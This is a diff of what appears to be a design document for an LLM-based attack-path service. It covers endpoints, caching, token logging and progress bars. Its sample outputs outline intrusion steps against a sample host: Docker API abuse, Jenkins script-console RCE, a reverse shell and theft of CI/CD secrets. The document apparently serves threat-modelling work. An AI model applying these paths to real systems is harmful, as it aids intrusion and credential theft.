+{"timestamp": "2025-10-16T14:32:20.891Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "bifurcation_detection", "model": "gpt-4o-mini", "tokens": {"prompt": 4100, "completion": 900, "total": 5000}, "response_time_seconds": 3.234, "cost_estimate_usd": 0.00147, "metadata": {}}
+{"timestamp": "2025-10-16T14:32:25.123Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "branch_B1", "model": "gpt-4o-mini", "tokens": {"prompt": 3800, "completion": 1500, "total": 5300}, "response_time_seconds": 4.789, "cost_estimate_usd": 0.00147, "metadata": {}}
+{"timestamp": "2025-10-16T14:32:30.456Z", "request_id": "a1b2c3d4-e5f6-7890", "call_type": "branch_B2", "model": "gpt-4o-mini", "tokens": {"prompt": 3700, "completion": 1400, "total": 5100}, "response_time_seconds": 4.567, "cost_estimate_usd": 0.00143, "metadata": {}}
+```
+
+### Log Analysis
+
+**Simple Python Script:**
+
+```python
+import json
+from collections import defaultdict
+
+def analyze_token_usage(log_file="logs/token_usage.jsonl"):
+    total_tokens = 0
+    total_cost = 0
+    calls_by_type = defaultdict(int)
+    tokens_by_type = defaultdict(int)
+    
+    with open(log_file) as f:
+        for line in f:
+            entry = json.loads(line)
+            total_tokens += entry["tokens"]["total"]
+            total_cost += entry.get("cost_estimate_usd", 0)
+            
+            call_type = entry["call_type"]
+            calls_by_type[call_type] += 1
+            tokens_by_type[call_type] += entry["tokens"]["total"]
+    
+    print(f"Total Tokens: {total_tokens:,}")
+    print(f"Total Cost: ${total_cost:.4f}")
+    print(f"\nBreakdown by Call Type:")
+    for call_type, count in calls_by_type.items():
+        print(f"  {call_type}: {count} calls, {tokens_by_type[call_type]:,} tokens")
+```
+
+### Benefits
+
+✅ **No database required** - simple file-based logging  
+✅ **No client overhead** - tokens not in API response  
+✅ **Per-request tracking** - group calls by request ID  
+✅ **Call type categorization** - primary_path, bifurcation_detection, branches  
+✅ **Cost estimation** - automatic calculation per model  
+✅ **Performance monitoring** - response time tracking  
+✅ **Automatic rotation** - prevents disk space issues  
+✅ **Easy analysis** - structured JSON format  
+
+---
+
+## Progress Tracking
+
+### Why Progress Tracking is Critical
+
+**Problem:** Complete bifurcation analysis takes 23+ seconds:
+- Primary path generation: ~5-15 seconds
+- Bifurcation detection: ~5-10 seconds
+- Branch generation: ~3-5 seconds per branch (×2-4 branches)
+
+**Without progress tracking:**
+- ❌ Backend waits in silence for 23+ seconds
+- ❌ No visibility into which phase is running
+- ❌ Difficult to debug if service hangs
+- ❌ Poor user experience (appears frozen)
+
+**With progress tracking:**
+- ✅ Real-time visibility into execution progress
+- ✅ Clear indication of current phase (primary path, bifurcations, branches)
+- ✅ Easy debugging (see where service stopped)
+- ✅ Confidence that service is actively working
+
+### Terminal Progress Bar Implementation
+
+**Library:** `tqdm` (Text Progress Bar for Python)
+
+```bash
+pip install tqdm
+```
+
+**Implementation in `/attack-path/complete` endpoint:**
+
+```python
+from tqdm import tqdm
+import uuid
+from typing import Dict, List
+
+@app.post("/attack-path/complete")
+async def generate_complete_attack_path(host: InputHost):
+    """
+    Complete attack path analysis with bifurcations and branches.
+    Shows progress bar in service terminal during execution.
+    """
+    
+    # Initialize cache
+    request_cache = {
+        "request_id": str(uuid.uuid4()),
+        "host": host,
+        "attack_path": None,
+        "bifurcations": None,
+        "branches": {}
+    }
+    
+    # Create progress bar with estimated total steps
+    # Phase 1 (primary) + Phase 2 (bifurcations) + Phase 3 (branches)
+    # We'll dynamically update total once we know branch count
+    pbar = tqdm(total=2, desc="Attack Path Analysis", unit="phase")
+    
+    try:
+        # ============================================
+        # PHASE 1: Generate Primary Attack Path
+        # ============================================
+        pbar.set_description("🔍 Phase 1: Generating primary path")
+        primary_result = await analyzer.analyze(host)
+        request_cache["attack_path"] = primary_result.attack_path
+        pbar.update(1)  # Update: 1/2 phases complete
+        
+        # ============================================
+        # PHASE 2: Detect Bifurcation Points
+        # ============================================
+        pbar.set_description("🔀 Phase 2: Detecting bifurcations")
+        bifurcations_result = await detect_bifurcations(
+            attack_path=request_cache["attack_path"],
+            host=request_cache["host"]
+        )
+        request_cache["bifurcations"] = bifurcations_result.bifurcations
+        pbar.update(1)  # Update: 2/2 phases complete
+        
+        # ============================================
+        # PHASE 3: Generate Branches (Dynamic Count)
+        # ============================================
+        # Count total branches to generate
+        total_branches = sum(
+            len(bif.alternatives) 
+            for bif in request_cache["bifurcations"]
+        )
+        
+        if total_branches > 0:
+            # Update progress bar with new total
+            pbar.close()  # Close phase-based bar
+            pbar = tqdm(
+                total=total_branches, 
+                desc="🌿 Phase 3: Generating branches", 
+                unit="branch"
+            )
+            
+            # Generate each branch
+            for bif_idx, bifurcation in enumerate(request_cache["bifurcations"]):
+                for alternative in bifurcation.alternatives:
+                    pbar.set_description(
+                        f"🌿 Generating branch {alternative.id} "
+                        f"(bif {bif_idx}, {alternative.technique})"
+                    )
+                    
+                    branch = await generate_branch(
+                        attack_path=request_cache["attack_path"],
+                        host=request_cache["host"],
+                        bifurcation_index=bif_idx,
+                        branch_id=alternative.id
+                    )
+                    request_cache["branches"][alternative.id] = branch
+                    pbar.update(1)  # Update: +1 branch complete
+        
+        pbar.close()
+        
+        # Format and return complete result
+        return format_complete_response(request_cache)
+        
+    except Exception as e:
+        pbar.close()
+        logger.error(f"Error in complete analysis: {e}")
+        raise
+```
+
+### Terminal Output Example
+
+**During Execution:**
+
+```text
+🔍 Phase 1: Generating primary path: 50%|███████          | 1/2 [00:08<00:08, 8.2s/phase]
+```
+
+```text
+🔀 Phase 2: Detecting bifurcations: 100%|█████████████████| 2/2 [00:18<00:00, 9.1s/phase]
+```
+
+```text
+🌿 Generating branch B2 (bif 1, MySQL pivot):  75%|████████████▌    | 3/4 [00:12<00:04, 4.1s/branch]
+```
+
+**After Completion:**
+
+```text
+Attack Path Analysis: 100% complete in 23.4s
+├─ Primary path generated (8.2s)
+├─ Bifurcations detected: 2 decision points (9.1s)
+└─ Branches generated: 4 paths (6.1s)
+```
+
+### Progress Tracking Architecture
+
+**Important:** Progress is shown in the **AI Service terminal only**, not streamed to backend.
+
+```text
+┌─────────────┐         ┌──────────────┐         ┌─────────────┐
+│  Frontend   │────────▶│   Backend    │────────▶│ AI Service  │
+└─────────────┘         └──────────────┘         └─────────────┘
+                             ▲                         │
+                             │                         │ (Progress bar
+                             │                         │  in terminal)
+                             │                         │
+                         ┌───┴────┐                    ▼
+                         │ Waits  │              ┌───────────┐
+                         │ 23s    │              │  Terminal │
+                         └────────┘              │  🔍 50%   │
+                                                 └───────────┘
+```
+
+**Workflow:**
+
+1. Backend sends `POST /attack-path/complete` with host params
+2. AI Service starts execution, creates progress bar in its terminal
+3. Service operators see real-time progress in service logs/terminal
+4. Backend waits for complete result (no streaming needed)
+5. After 23s, backend receives complete formatted response
+
+### Configuration Options
+
+**Disable Progress Bar (Production):**
+
+```python
+# Add environment variable check
+SHOW_PROGRESS = os.getenv("SHOW_PROGRESS_BAR", "true").lower() == "true"
+
+# In endpoint
+if SHOW_PROGRESS:
+    pbar = tqdm(total=2, desc="Attack Path Analysis")
+else:
+    pbar = None  # No progress bar in production
+```
+
+**Custom Progress Format:**
+
+```python
+pbar = tqdm(
+    total=2,
+    desc="Analysis",
+    unit="step",
+    bar_format='{desc}: {percentage:3.0f}%|{bar}| {n}/{total} [{elapsed}<{remaining}]'
+)
+```
+
+### Benefits Summary
+
+| Feature | Without Progress | With Progress Bar |
+|---------|------------------|-------------------|
+| **Visibility** | Black box (23s wait) | Real-time status updates |
+| **Debugging** | Difficult (where did it hang?) | Easy (see last completed phase) |
+| **User Experience** | Appears frozen | Active feedback |
+| **Operations** | No monitoring | Terminal logs show progress |
+| **Backend Impact** | None (waits anyway) | None (terminal only) |
 
 ---
 
 ## API Design
 
-### Option 1: Query Parameter (Recommended)
+### Hybrid Architecture: Complete + Granular Endpoints
 
-**Extend existing endpoint with backward compatibility**
-
-```python
-@app.post("/attack-path", response_model=EnhancedAttackPathResponse)
-async def generate_attack_path(
-    host: InputHost,
-    include_prompt: bool = Query(default=True, description="Include generated prompt in response"),
-    include_bifurcations: bool = Query(default=False, description="Analyze and include alternative attack paths")
-):
-    """
-    Generate attack path analysis with optional bifurcation detection.
-    
-    Query Parameters:
-    - include_prompt: Return the LLM prompt (debugging/transparency)
-    - include_bifurcations: Perform multi-pass analysis to find alternative paths
-    
-    With bifurcations=false (default):
-      - Returns standard single-path analysis
-      - Fast response (1 LLM call)
-      - Backward compatible with existing clients
-    
-    With bifurcations=true:
-      - Returns enhanced analysis with branches
-      - Slower response (1 + 1 + N LLM calls)
-      - Provides comprehensive attack coverage
-    """
-    
-    if include_bifurcations:
-        # Three-pass analysis
-        result = await analyzer.analyze_with_bifurcations(host, include_prompt)
-    else:
-        # Standard single-path analysis (existing functionality)
-        result = await analyzer.analyze(host, include_prompt)
-    
-    return result
-```
-
-**Benefits:**
-- ✅ Backward compatible (existing clients unaffected)
-- ✅ Single endpoint, easy to discover
-- ✅ Progressive enhancement
-- ✅ Clear separation of concerns
+**Recommended for Production:** `/attack-path/complete` (server-side caching + progress tracking)  
+**Available for Flexibility:** Three granular endpoints (testing, debugging, power users)
 
 ---
 
-### Option 2: Separate Endpoint
+#### **🌟 PRIMARY: Endpoint 4 `/attack-path/complete` (NEW - Unified Analysis)**
 
-**Add new endpoint for advanced analysis**
+**Purpose:** Production-ready complete bifurcation analysis with server-side caching and progress tracking.
+
+```python
+from app.models.bifurcation import CompleteAnalysisResponse
+
+@app.post("/attack-path/complete", response_model=CompleteAnalysisResponse)
+async def generate_complete_attack_path(host: InputHost):
+    """
+    Complete attack path analysis with bifurcations and branches.
+    
+    Features:
+    - Server-side caching (host params stored internally)
+    - Progress tracking (terminal progress bar)
+    - Single client request
+    - Complete formatted response
+    
+    Input:
+      {
+        "platform": "Linux",
+        "open_ports": [2375, 8080, 3306],
+        "services": [...],
+        "vulnerabilities": [...],
+        // ... all 50+ optional InputHost fields
+      }
+    
+    Process:
+      Phase 1: Generate primary path (cached host)
+      Phase 2: Detect bifurcations (uses cached data)
+      Phase 3: Generate branches (uses cached data)
+    
+    Returns:
+      {
+        "request_id": "uuid",
+        "primary_path": ["Stage 1: ...", "Stage 2: ...", ...],
+        "bifurcations": [
+          {
+            "stage_index": 3,
+            "decision_point": "...",
+            "branches": [
+              {
+                "branch_id": "B1",
+                "continuation_path": ["Stage 4: ...", ...]
+              }
+            ]
+          }
+        ],
+        "total_paths": 5,
+        "execution_time": 23.4
+      }
+    """
+    # Initialize cache
+    request_cache = {
+        "request_id": str(uuid.uuid4()),
+        "host": host,  # Cached for all phases
+        "attack_path": None,
+        "bifurcations": None,
+        "branches": {}
+    }
+    
+    # Progress bar setup
+    pbar = tqdm(total=2, desc="Attack Path Analysis", unit="phase")
+    
+    try:
+        # Phase 1: Primary path
+        pbar.set_description("🔍 Generating primary path")
+        primary_result = await analyzer.analyze(request_cache["host"])
+        request_cache["attack_path"] = primary_result.attack_path
+        pbar.update(1)
+        
+        # Phase 2: Bifurcation detection
+        pbar.set_description("🔀 Detecting bifurcations")
+        bifurcations_result = await detect_bifurcations(
+            attack_path=request_cache["attack_path"],
+            host=request_cache["host"]  # Reused from cache
+        )
+        request_cache["bifurcations"] = bifurcations_result.bifurcations
+        pbar.update(1)
+        
+        # Phase 3: Branch generation
+        total_branches = sum(len(b.alternatives) for b in request_cache["bifurcations"])
+        if total_branches > 0:
+            pbar.close()
+            pbar = tqdm(total=total_branches, desc="🌿 Generating branches", unit="branch")
+            
+            for bif_idx, bifurcation in enumerate(request_cache["bifurcations"]):
+                for alternative in bifurcation.alternatives:
+                    branch = await generate_branch(
+                        attack_path=request_cache["attack_path"],
+                        host=request_cache["host"],  # Reused from cache
+                        bifurcation_index=bif_idx,
+                        branch_id=alternative.id
+                    )
+                    request_cache["branches"][alternative.id] = branch
+                    pbar.update(1)
+        
+        pbar.close()
+        return format_complete_response(request_cache)
+        
+    except Exception as e:
+        pbar.close()
+        raise
+```
+
+**Response Time:** 23-35 seconds (full analysis)  
+**Cost:** ~$0.03-0.08 (depends on branch count)  
+**LLM Calls:** 1 (primary) + 1 (bifurcations) + N (branches)
+
+**Benefits:**
+- ✅ Single API call from backend (send host params once)
+- ✅ Server-side caching (no LLM data duplication)
+- ✅ Progress tracking (real-time terminal visibility)
+- ✅ Complete formatted result (primary + bifurcations + branches)
+- ✅ Simplified backend logic (no orchestration needed)
+
+**Use Case:** Production deployments, frontend integration, complete analysis workflows
+
+---
+
+### Granular Endpoints (Optional - For Testing & Debugging)
+
+The following three endpoints remain available for granular control, testing, and power users who want step-by-step execution.
+
+---
+
+#### **Endpoint 1: `/attack-path` (Existing - UNCHANGED)**
 
 ```python
 @app.post("/attack-path", response_model=AttackPathResponse)
-async def generate_attack_path(host: InputHost, include_prompt: bool = True):
-    """Standard single-path analysis (existing endpoint)"""
+async def generate_attack_path(
+    host: InputHost,
+    include_prompt: bool = Query(default=True)
+):
+    """
+    Generate single linear attack path (existing functionality).
+    
+    Returns:
+      {
+        "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...]
+      }
+    """
     return await analyzer.analyze(host, include_prompt)
-
-@app.post("/attack-graph", response_model=EnhancedAttackPathResponse)
-async def generate_attack_graph(host: InputHost, include_prompt: bool = True):
-    """Advanced multi-path analysis with bifurcations"""
-    return await analyzer.analyze_with_bifurcations(host, include_prompt)
 ```
 
-**Benefits:**
-- ✅ Clear semantic difference
-- ✅ Can have different rate limits/pricing
-- ✅ Easier to version independently
-- ❌ More endpoints to maintain
+**Status:** Production-ready, no modifications needed
 
 ---
 
-### Recommended Approach
+#### **Endpoint 2: `/attack-path/bifurcations` (NEW - Detection Only)**
 
-**Use Option 1 (Query Parameter)** for simplicity and backward compatibility.
+```python
+from app.models.bifurcation import BifurcationDetectionRequest, BifurcationDetectionResponse
 
-**Example API Calls:**
+@app.post("/attack-path/bifurcations", response_model=BifurcationDetectionResponse)
+async def detect_bifurcations(request: BifurcationDetectionRequest):
+    """
+    Detect decision points in an attack path (lightweight analysis).
+    
+    Input:
+      {
+        "attack_path": ["Reconnaissance: ...", "Weaponization: ...", ...],
+        "host": {"platform": "Linux", "open_ports": [...], ...}
+      }
+    
+    Process:
+      - Analyze attack_path with full host context
+      - Identify bifurcation points (decision points)
+      - Return alternative metadata WITHOUT generating paths
+    
+    Returns:
+      {
+        "bifurcations": [
+          {
+            "stage_index": 3,
+            "stage_name": "Execution",
+            "attacker_context": "...",
+            "decision_point": "...",
+            "alternatives": [
+              {"id": "B1", "technique": "...", "reason": "...", "probability": "high"},
+              {"id": "B2", "technique": "...", "reason": "...", "probability": "medium"}
+            ]
+          }
+        ]
+      }
+    """
+    bifurcation_detector = BifurcationDetector()
+    return await bifurcation_detector.detect(
+        attack_path=request.attack_path,
+        host=request.host
+    )
+```
+
+**Response Time:** 5-10 seconds (1 LLM call)  
+**Cost:** ~$0.01-0.02
+
+---
+
+#### **Endpoint 3: `/attack-path/bifurcations/{bifurcation_index}/branches/{branch_id}` (NEW - On-Demand)**
+
+```python
+from app.models.bifurcation import BranchGenerationRequest, BranchGenerationResponse
+
+@app.post(
+    "/attack-path/bifurcations/{bifurcation_index}/branches/{branch_id}",
+    response_model=BranchGenerationResponse
+)
+async def generate_branch(
+    bifurcation_index: int,
+    branch_id: str,
+    request: BranchGenerationRequest
+):
+    """
+    Generate continuation path for a specific branch (on-demand).
+    
+    Input:
+      {
+        "attack_path": ["Reconnaissance: ...", ...],
+        "host": {"platform": "Linux", ...},
+        "bifurcation_index": 0,
+        "branch_id": "B1"
+      }
+    
+    Process:
+      - Retrieve bifurcation point from detection results
+      - Generate continuation path for specified branch
+      - Return complete attack path from bifurcation to end
+    
+    Returns:
+      {
+        "branch_id": "B1",
+        "bifurcation_index": 0,
+        "from_stage": 3,
+        "continuation_path": [
+          "Installation: Jenkins Groovy Script RCE...",
+          "Command and Control: ...",
+          "Actions on Objectives: ..."
+        ]
+      }
+    """
+    branch_generator = BranchGenerator()
+    return await branch_generator.generate(
+        attack_path=request.attack_path,
+        host=request.host,
+        bifurcation_index=bifurcation_index,
+        branch_id=branch_id
+    )
+```
+
+**Response Time:** 3-5 seconds (1 LLM call)  
+**Cost:** ~$0.005-0.01 per branch
+
+---
+
+### Client Workflow Example
+
+**Sequential Three-Step Process:**
 
 ```bash
-# Standard analysis (current behavior)
-curl -X POST "http://localhost:8000/attack-path?include_bifurcations=false" \
+# Step 1: Generate primary attack path
+curl -X POST "http://localhost:8000/attack-path?include_prompt=false" \
   -H "Content-Type: application/json" \
-  -d @example_request_enhanced.json
+  -d '{
+    "platform": "Linux",
+    "version_os": "Ubuntu 20.04",
+    "open_ports": [2375, 8080, 3306],
+    "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
+    "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
+    "security_controls": ["fail2ban"],
+    "mfa_enabled": false,
+    "admin_accounts": ["root", "admin"],
+    "network_segment": "DMZ",
+    "internet_exposed": true,
+    "asset_criticality": "Critical",
+    "edr_agent": "None",
+    "configurations": ["Docker API exposed without TLS"],
+    "password_policy": "Weak - 8 character minimum"
+  }' > primary_path.json
 
-# Enhanced analysis with bifurcations
-curl -X POST "http://localhost:8000/attack-path?include_bifurcations=true" \
+# Response:
+# {
+#   "attack_path": [
+#     "Reconnaissance: Port scanning reveals Docker API, Jenkins, MySQL...",
+#     "Weaponization: Prepare Docker API exploit...",
+#     "Delivery: Direct connection to unauthenticated Docker API...",
+#     "Exploitation: Deploy privileged container with host access...",
+#     "Installation: Container restart policy persistence...",
+#     "Command and Control: Establish C2 via container...",
+#     "Actions on Objectives: Exfiltrate via mounted volumes..."
+#   ]
+# }
+
+
+# Step 2: Detect bifurcations (lightweight - only finds decision points)
+# Note: Pass the SAME complete host parameters from Step 1
+curl -X POST "http://localhost:8000/attack-path/bifurcations" \
   -H "Content-Type: application/json" \
-  -d @example_request_enhanced.json
+  -d '{
+    "attack_path": [
+      "Reconnaissance: Port scanning reveals Docker API, Jenkins, MySQL...",
+      "Weaponization: Prepare Docker API exploit...",
+      "Delivery: Direct connection to unauthenticated Docker API...",
+      "Exploitation: Deploy privileged container with host access...",
+      "Installation: Container restart policy persistence...",
+      "Command and Control: Establish C2 via container...",
+      "Actions on Objectives: Exfiltrate via mounted volumes..."
+    ],
+    "host": {
+      "platform": "Linux",
+      "version_os": "Ubuntu 20.04",
+      "open_ports": [2375, 8080, 3306],
+      "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
+      "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
+      "security_controls": ["fail2ban"],
+      "mfa_enabled": false,
+      "admin_accounts": ["root", "admin"],
+      "network_segment": "DMZ",
+      "internet_exposed": true,
+      "asset_criticality": "Critical",
+      "edr_agent": "None",
+      "configurations": ["Docker API exposed without TLS"],
+      "password_policy": "Weak - 8 character minimum"
+    }
+  }' > bifurcations.json
+
+# Response (FAST - no path generation yet):
+# {
+#   "bifurcations": [
+#     {
+#       "stage_index": 3,
+#       "stage_name": "Exploitation",
+#       "attacker_context": "Has Docker container access, can see Jenkins and MySQL",
+#       "decision_point": "Multiple exploitable services visible from container",
+#       "alternatives": [
+#         {
+#           "id": "B1",
+#           "technique": "Pivot to Jenkins",
+#           "reason": "Jenkins unauthenticated on /script endpoint",
+#           "probability": "high"
+#         },
+#         {
+#           "id": "B2",
+#           "technique": "Pivot to MySQL",
+#           "reason": "MySQL accessible with default credentials",
+#           "probability": "medium"
+#         }
+#       ]
+#     }
+#   ]
+# }
+
+
+# Step 3: Generate specific branches on-demand (user selects which to explore)
+# Example: User is interested in the Jenkins pivot (B1)
+curl -X POST "http://localhost:8000/attack-path/bifurcations/0/branches/B1" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "attack_path": [
+      "Reconnaissance: Port scanning reveals Docker API, Jenkins, MySQL...",
+      "Weaponization: Prepare Docker API exploit...",
+      "Delivery: Direct connection to unauthenticated Docker API...",
+      "Exploitation: Deploy privileged container with host access...",
+      "Installation: Container restart policy persistence...",
+      "Command and Control: Establish C2 via container...",
+      "Actions on Objectives: Exfiltrate via mounted volumes..."
+    ],
+    "host": {
+      "platform": "Linux",
+      "version_os": "Ubuntu 20.04",
+      "open_ports": [2375, 8080, 3306],
+      "services": ["Docker API on port 2375", "Jenkins 2.346.1 on port 8080", "MySQL 5.7.33 on port 3306"],
+      "vulnerabilities": ["CVE-2021-44228: Log4Shell RCE", "CVE-2021-3156: Sudo heap overflow"],
+      "security_controls": ["fail2ban"],
+      "mfa_enabled": false,
+      "admin_accounts": ["root", "admin"],
+      "network_segment": "DMZ",
+      "internet_exposed": true,
+      "asset_criticality": "Critical",
+      "edr_agent": "None",
+      "configurations": ["Docker API exposed without TLS"],
+      "password_policy": "Weak - 8 character minimum"
+    },
+    "bifurcation_index": 0,
+    "branch_id": "B1"
+  }' > branch_B1.json
+
+# Response:
+# {
+#   "branch_id": "B1",
+#   "bifurcation_index": 0,
+#   "from_stage": 3,
+#   "continuation_path": [
+#     "Installation: Jenkins Groovy Script Console RCE to execute arbitrary code...",
+#     "Command and Control: Establish reverse shell via Jenkins agent...",
+#     "Actions on Objectives: Steal CI/CD secrets and source code from Jenkins workspace..."
+#   ]
+# }
+
+# User can now optionally generate branch B2 if interested:
+# curl -X POST "http://localhost:8000/attack-path/bifurcations/0/branches/B2" ...
 ```
+
+---
+
+### Why Service 2 Needs Complete InputHost (All 50+ Parameters)
+
+**Critical Design Decision:** Service 2 receives the **exact same InputHost** object (all 50+ optional parameters) that was sent to Service 1.
+
+#### **Rationale:**
+
+1. **Attack Path Strings Have Limitations:**
+   - Describe what the attacker DID, not what's AVAILABLE
+   - May not mention all services, vulnerabilities, or misconfigurations
+   - Lack details about security controls, credentials, network topology
+   - Example: "Deploy container" doesn't tell us Jenkins and MySQL are on the network
+
+2. **Full Context Enables Better Bifurcations:**
+   ```
+   Attack Path String: "Exploitation: Deploy privileged container"
+   
+   LLM with just the string:
+     → "Attacker has container access" (limited insight)
+   
+   LLM with full InputHost:
+     → Sees host.services: ["Jenkins 2.346.1", "MySQL 5.7.33"]
+     → Sees host.vulnerabilities: ["CVE-2021-44228"]
+     → Sees host.security_controls: ["fail2ban"] (knows what to evade)
+     → Sees host.mfa_enabled: false (knows auth is weak)
+     → Identifies: "From container, pivot to Jenkins (no auth) OR MySQL (default creds)"
+   ```
+
+3. **50+ Parameters Provide:**
+   - **Available Targets:** Services, software, databases, cloud resources
+   - **Exploitable Weaknesses:** CVEs, misconfigurations, weak credentials
+   - **Security Context:** EDR presence, MFA status, firewall rules, network segmentation
+   - **Credential Intel:** Password policies, admin accounts, service accounts
+   - **Risk Context:** Asset criticality, business role, data classification
+
+4. **No Information Loss:**
+   - Client simply passes the same InputHost to both services
+   - Service 2 has complete picture for realistic alternative path generation
+   - Bifurcations reference specific CVEs, software versions, accounts
+
+#### **Implementation:**
+
+```python
+# Client keeps the same host parameters
+host_params = InputHost(
+    platform="Linux",
+    version_os="Ubuntu 20.04",
+    open_ports=[2375, 8080, 3306],
+    services=[...],
+    vulnerabilities=[...],
+    security_controls=[...],
+    # ... all 50+ fields
+)
+
+# Step 1: Service 1
+attack_path = await client.post("/attack-path", json=host_params)
+
+# Step 2: Service 2 (reuses SAME host_params)
+bifurcations = await client.post("/attack-path/bifurcations", json={
+    "attack_path": attack_path["attack_path"],
+    "host": host_params  # Complete context preserved
+})
+```
+
+---
+
+### Benefits of Three-Endpoint Approach
+
+| Benefit | Description |
+|---------|-------------|
+| **Zero Impact** | `/attack-path` endpoint completely unchanged |
+| **True Separation** | Independent services, independent testing, independent deployment |
+| **Client Control** | Clients choose which branches to generate (on-demand) |
+| **Fast Feedback** | Bifurcation detection is fast (~5-10 sec), user sees options immediately |
+| **Cost Efficiency** | Only generate branches user wants to explore (save $0.01 per skipped branch) |
+| **Better Caching** | Can cache primary path and bifurcation detection separately |
+| **Flexible Pricing** | Different rate limits/costs per endpoint |
+| **Error Isolation** | If branch generation fails, detection still works |
+| **Independent Scaling** | Scale detection vs generation based on usage patterns |
+| **Progressive Enhancement** | Basic users get detection only, advanced users generate branches |
+| **Clear Semantics** | Each endpoint has single, clear purpose |
+
+---
+
+### Alternative Approach (Not Recommended)
+
+**Single Endpoint with Query Parameter:**
+
+```python
+@app.post("/attack-path?include_bifurcations=true")
+```
+
+**Why Not Recommended:**
+- ❌ Adds branching logic to existing endpoint
+- ❌ Response structure changes based on parameter
+- ❌ Harder to test independently
+- ❌ Couples two different concerns
+- ❌ If bifurcation analysis fails, entire request fails
 
 ---
 
 ## Implementation Phases
 
-### Phase 1: Foundation (Week 1)
+**Development Approach:** AI-Copilot assisted implementation - phases represent logical implementation order, not time-based milestones.
 
-**Goal:** Add data models and basic structure
-
-**Tasks:**
-1. Create new Pydantic models in `app/models/analysis.py`:
-   - `AlternativeBranch`
-   - `Bifurcation`
-   - `AttackGraph`
-   - `EnhancedAttackPathResponse`
-
-2. Add new prompt builders in `app/core/prompts.py`:
-   - `build_bifurcation_analysis_prompt()`
-   - `build_branch_continuation_prompt()`
-
-3. Update `app/services/analyzer.py`:
-   - Add `analyze_with_bifurcations()` method (stub)
-
-4. Update `app/main.py`:
-   - Add `include_bifurcations` query parameter
-   - Wire up new analyzer method
-
-**Deliverable:** API accepts `include_bifurcations` parameter (returns empty bifurcations array)
+**Priority:** Phase 4 (`/attack-path/complete` endpoint) is the **primary production endpoint**. Phases 1-3 are supporting infrastructure.
 
 ---
 
-### Phase 2: Bifurcation Detection (Week 2)
+### Phase 1: Foundation & Data Models
 
-**Goal:** Implement Pass 2 (identify bifurcation points)
+**Goal:** Create separate service structure with no impact on existing code
 
 **Tasks:**
-1. Implement `build_bifurcation_analysis_prompt()` fully
-2. Add LLM call for bifurcation detection in analyzer
-3. Parse bifurcation JSON response
-4. Return bifurcations in response (without continuation paths yet)
 
-**Testing:**
-- Test with `example_request_enhanced.json`
-- Verify bifurcations are identified at stages 2-3 (Docker → Jenkins/MySQL)
-- Validate JSON parsing
+1. Install progress bar library:
+   ```bash
+   pip install tqdm
+   # Add to requirements.txt: tqdm>=4.66.1
+   ```
 
-**Deliverable:** API returns identified bifurcation points with alternative descriptions
+2. Create new directory structure:
+   ```text
+   app/
+   ├── models/
+   │   ├── analysis.py          # Existing - UNCHANGED
+   │   └── bifurcation.py       # NEW
+   ├── services/
+   │   ├── analyzer.py           # Existing - UNCHANGED
+   │   ├── bifurcation_detector.py  # NEW (Service 2)
+   │   └── branch_generator.py      # NEW (Service 3)
+   └── core/
+       ├── prompts.py            # Existing - UNCHANGED
+       └── bifurcation_prompts.py   # NEW
+   ```
+
+3. Create `app/models/bifurcation.py`:
+   - `BifurcationDetectionRequest` / `BifurcationDetectionResponse`
+   - `BranchGenerationRequest` / `BranchGenerationResponse`
+   - `CompleteAnalysisResponse` (NEW - for `/attack-path/complete`)
+   - `AlternativeMetadata`, `BifurcationPoint`, `BranchResult`
+
+4. Create service stubs:
+   - `app/services/bifurcation_detector.py` with `BifurcationDetector` class
+   - `app/services/branch_generator.py` with `BranchGenerator` class
+
+5. Create prompt builder stub:
+   - `app/core/bifurcation_prompts.py` with `BifurcationPromptBuilder` class
+
+6. Update `app/main.py` - **add all four endpoints**:
+   - Keep `/attack-path` (existing - UNCHANGED)
+   - Add `/attack-path/bifurcations` (Service 2 - granular)
+   - Add `/attack-path/bifurcations/{idx}/branches/{id}` (Service 3 - granular)
+   - Add `/attack-path/complete` (Service 4 - **PRIMARY PRODUCTION ENDPOINT**)
+
+7. Create token tracking infrastructure:
+   - `app/utils/token_logger.py` with `TokenLogger` class
+   - JSON Lines logging with rotation
+
+**Deliverable:** New endpoints exist (return empty/stub responses), `/attack-path` unchanged
 
 ---
 
-### Phase 3: Branch Generation (Week 3)
+### Phase 2: Bifurcation Detection (Service 2)
 
-**Goal:** Implement Pass 3 (generate continuation paths)
+**Goal:** Implement lightweight bifurcation detection (used by both granular endpoint and complete endpoint)
 
 **Tasks:**
-1. Implement `build_branch_continuation_prompt()` fully
-2. For each bifurcation/alternative, call LLM to generate continuation
-3. Parse continuation path responses
-4. Attach continuation paths to bifurcation branches
-5. Handle LLM errors gracefully (continue with partial results)
+
+1. Implement `build_detection_prompt()` in `bifurcation_prompts.py`:
+   - Takes `attack_path` (list of strings) + `host` parameters
+   - Builds prompt to identify decision points WITHOUT generating paths
+   - Returns formatted prompt string
+
+2. Implement `BifurcationDetector.detect()`:
+   - Accept `attack_path` and `host` parameters
+   - Call LLM with detection prompt
+   - Parse bifurcation JSON response
+   - Return `BifurcationDetectionResponse` with alternatives metadata ONLY
+
+3. Integrate token tracking:
+   - Add `request_id` and `call_type="bifurcation_detection"` to all LLM calls
 
 **Testing:**
-- Test complete three-pass flow
+- Call `/attack-path` to get primary path
+- Pass path to `/attack-path/bifurcations` endpoint
+- Verify bifurcations detected with alternative metadata (NO continuation paths yet)
+- Check token logs in `logs/token_usage.jsonl`
+- Verify response time < 10 seconds
+
+**Deliverable:** Bifurcation detection working, can be called standalone or from complete endpoint
+
+---
+
+### Phase 3: Branch Generation (Service 3)
+
+**Goal:** Generate specific branch continuation paths on-demand
+
+**Tasks:**
+
+1. Implement `build_branch_prompt()` in `bifurcation_prompts.py`:
+   - Takes bifurcation context + branch_id + host parameters
+   - Builds prompt to generate ONE specific continuation
+   - Returns formatted prompt string
+
+2. Implement `BranchGenerator.generate()`:
+   - Accept attack_path, host, bifurcation_index, branch_id
+   - Call LLM with branch prompt
+   - Parse continuation path response
